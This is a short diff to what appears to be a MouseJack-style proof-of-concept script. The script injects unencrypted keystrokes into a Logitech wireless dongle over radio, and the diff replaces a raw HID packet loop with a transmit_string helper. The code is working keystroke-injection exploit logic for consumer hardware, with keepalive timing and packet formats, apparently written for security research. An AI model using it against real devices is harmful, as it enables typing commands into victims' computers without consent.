@@ -46,20 +46,22 @@ def main():
     So we first send the dongle a packet that sets a relatively long keepalive timeout, and then transmit keepalives very frequently. This way we can be confident
     that there won't be a timeout that would cause the dongle to switch channels unexpectedly.
     '''
-    hid_scan_codes_1_to_9 = [KEY_1, KEY_2, KEY_3, KEY_4, KEY_5, KEY_6, KEY_7, KEY_8, KEY_9]
+    # hid_scan_codes_1_to_9 = [KEY_1, KEY_2, KEY_3, KEY_4, KEY_5, KEY_6, KEY_7, KEY_8, KEY_9]
 
     # transmitting payload that sets the keepalive timeout to 1200ms (=0x4B0)
     radio.transmit_payload(SET_KEEPALIVE_TIMEOUT_PAYLOAD)
     time.sleep(SLEEPING_PERIOD) # sleeping for 12ms
 
     # transmitting '1' to '9'
-    for key in hid_scan_codes_1_to_9:
-        # refer to Table 8 in the MouseJack whitepaper: Logitech Unencrypted Keystroke Payload
-        radio.transmit_payload(with_checksum([0x00, 0xC1, 0x00, key, 0x00, 0x00, 0x00, 0x00, 0x00])) # third byte is always zero because it's the modifier mask (e.g. Ctrl, Shift, Alt...) which we don't need
-        time.sleep(SLEEPING_PERIOD) # sleeping for 12ms
-        radio.transmit_payload(KEEPALIVE_PAYLOAD) # transmitting keepalive after each keystroke
-    # at the end, transmitting a key release packet (scan code = 0x00), otherwise it would keep typing '9' forever
-    radio.transmit_payload(with_checksum([0x00, 0xC1, 0x00, KEY_RELEASE, 0x00, 0x00, 0x00, 0x00, 0x00]))
+    # for key in hid_scan_codes_1_to_9:
+    #     # refer to Table 8 in the MouseJack whitepaper: Logitech Unencrypted Keystroke Payload
+    #     radio.transmit_payload(with_checksum([0x00, 0xC1, 0x00, key, 0x00, 0x00, 0x00, 0x00, 0x00])) # third byte is always zero because it's the modifier mask (e.g. Ctrl, Shift, Alt...) which we don't need
+    #     time.sleep(SLEEPING_PERIOD) # sleeping for 12ms
+    #     radio.transmit_payload(KEEPALIVE_PAYLOAD) # transmitting keepalive after each keystroke
+    # # at the end, transmitting a key release packet (scan code = 0x00), otherwise it would keep typing '9' forever
+    # radio.transmit_payload(with_checksum([0x00, 0xC1, 0x00, KEY_RELEASE, 0x00, 0x00, 0x00, 0x00, 0x00]))
+
+    transmit_string(radio, "123456789")
 
 if __name__ == "__main__":
     main()
